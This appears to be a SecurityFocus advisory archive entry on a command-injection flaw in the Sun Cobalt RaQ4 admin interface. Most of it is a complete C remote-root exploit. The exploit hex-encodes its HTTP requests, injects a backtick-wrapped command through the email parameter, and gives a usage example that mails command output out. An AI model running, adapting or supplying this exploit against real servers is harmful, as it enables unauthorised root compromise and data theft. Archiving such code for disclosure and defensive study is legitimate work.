source: http://www.securityfocus.com/bid/6326/info

The RaQ4 is a server appliance distributed and maintained by Sun Microsystems.

A vulnerability has been reported in the web administration interface of the RaQ4. It is possible for a remote attacker to execute commands. By passing malicious email parameter to the vulnerable CGI script, commands are carried out in the security context of the administration server.

This vulnerability only affects RaQ4 servers with the RaQ4 Security Hardening Package (SHP) installed. The SHP is not installed by default.

// RaQ 4 and possibly others easy remote root compromise
// due to a flaw in the Security Hardening package HEHE!
// Wouter ter Maat aka grazer - http://www.i-security.nl
 
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORT 81 /* default cobalt admin httpd  
                   try 444 if 81 runs with ssl */

// cmpstr
#define found "overflow" 
#define done "Starting"
#define exec "mail"

// prototypes
int banner();
int makereq(char *host, char *request, char *cmpstr, int port);

int main(int argc, char *argv[]) {
int retval, port;

char cmd[1024];
char cbuf[1024];
char request2[3096];

// evi1 requests
char request1[] = "\x47\x45\x54\x20\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x2e"
                  "\x63\x6f\x62\x61\x6c\x74\x2f\x6f\x76\x65\x72\x66\x6c\x6f"
                  "\x77\x2f\x6f\x76\x65\x72\x66\x6c\x6f\x77\x2e\x63\x67\x69"
                  "\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\n\x48\x6f\x73"
                  "\x74\x3a\x20\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\n\n\n";

char req_tmp[] = "\x50\x4f\x53\x54\x20\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x2e"
		 "\x63\x6f\x62\x61\x6c\x74\x2f\x6f\x76\x65\x72\x66\x6c\x6f\x77"
		 "\x2f\x6f\x76\x65\x72\x66\x6c\x6f\x77\x2e\x63\x67\x69\x20\x48"
		 "\x54\x54\x50\x2f\x31\x2e\x31\n\x41\x63\x63\x65\x70\x74\x3a\x20"
		 "\x69\x6d\x61\x67\x65\x2f\x67\x69\x66\x2c\x20\x69\x6d\x61\x67"
		 "\x65\x2f\x78\x2d\x78\x62\x69\x74\x6d\x61\x70\x2c\x20\x69\x6d"
		 "\x61\x67\x65\x2f\x6a\x70\x65\x67\x2c\x20\x69\x6d\x61\x67\x65"
		 "\x2f\x70\x6a\x70\x65\x67\x2c\x20\x2a\x2f\x2a\n\x41\x63\x63"
		 "\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x6e\x6c\n"
		 "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x61"
		 "\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x2d\x77\x77"
		 "\x77\x2d\x66\x6f\x72\x6d\x2d\x75\x72\x6c\x65\x6e\x63\x6f\x64"
		 "\x65\x64\n\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64"
		 "\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70\x2c\x20\x64\x65\x66\x6c"
		 "\x61\x74\x65\n\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20"
		 "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x3b\x29\n"
		 "\x48\x6f\x73\x74\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
		 "\x3a\x38\x31\n";

char request3[] = "\x47\x45\x54\x20\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x2e\x63"
		  "\x6f\x62\x61\x6c\x74\x2f\x6f\x76\x65\x72\x66\x6c\x6f\x77\x2f"
		  "\x6f\x76\x65\x72\x66\x6c\x6f\x77\x54\x65\x73\x74\x45\x6d\x61"
	          "\x69\x6c\x2e\x63\x67\x69\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\n"
	          "\x48\x6f\x73\x74\x3a\x20\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\n\n\n";

sprintf(cmd, "%s%s%s", "enabled=1&email=`", argv[2], "`&page=overflow\n\n");
sprintf(cbuf, "%s %d %s", "Content-Length:", strlen(cmd)-2, "\n\n");
sprintf(request2, "%s%s%s", req_tmp, cbuf, cmd);

banner();

  while(argc < 3) {
    fprintf(stderr, " %s <host> <command> <port> \n", argv[0]);
    fprintf(stderr, " example: www.cobalt.com \"id|mail you@addy\" 444\n");
    fprintf(stderr, " default port is set to 81. \n\n");
    exit(0); }

if(argc==3) {
port = PORT; }
else { 
port = atoi(argv[3]); }

retval = makereq(argv[1], request1, found, port); 

if(retval==2) { 
  printf(" - name cannot be resolved!\n"); 
 exit(0); } if(retval==3) { 
  printf(" - connect: connection refused! d0h!\n");
 exit(0); }

if(retval==404) { 
  printf(" - this machine is not vulnerable, dweep!\n"); 
 exit(0); }
else { 
  printf(" + ow yeah, we've found a victim!\n"); } 


printf(" ++ Enabling stackguard and creating evil config file...\n");

retval = makereq(argv[1], request2, done, port); 

 if(retval==404) {
   printf(" -- attack failed , sorry! \n"); 
  exit(0);}
 else { 
   printf(" +++ config file written succesfully ! \n"); } 

 printf(" ++++ Let's get our evil command executed...\n");


retval = makereq(argv[1], request3, exec, port); 

if(retval==404) { 
  printf(" --- attack failed, sorry! \n"); 
 exit(0);} 
else { 
printf(" +++++ The command : \"%s\"\n +++++ has been run on the server.\n\n", argv[2]); }

}

int banner() { 
printf("*************************************************\n");
printf("RaQ 4 remote root exploit - grazer@digit-labs.org\n");
printf("Vulnerable : RaQ4 with Security Hardening Update.\n");
printf("             isn't it ironic? :]                 \n");
printf("*************************************************\n"); }

int makereq(char *host, char *request, char *cmpstr, int port) {

int fd, sock, chk;
char buf[2000];

struct sockaddr_in addr; 
struct hostent *lh;

if ((lh=gethostbyname(host)) == NULL){
             return 2; }

bzero(&(addr.sin_zero), 8);
addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr = *((struct in_addr *) lh-> h_addr);

fd = socket(AF_INET, SOCK_STREAM, 0);

if (connect(fd,(struct sockaddr *) &addr ,sizeof(addr)) != 0){
                return 3;
	}

send(fd, request, strlen(request), 0);
read(fd, buf, 500);
if(strstr(buf, cmpstr)!=0) { 
return 200; } else { 
return 404; }

close(fd);
return 1;
}
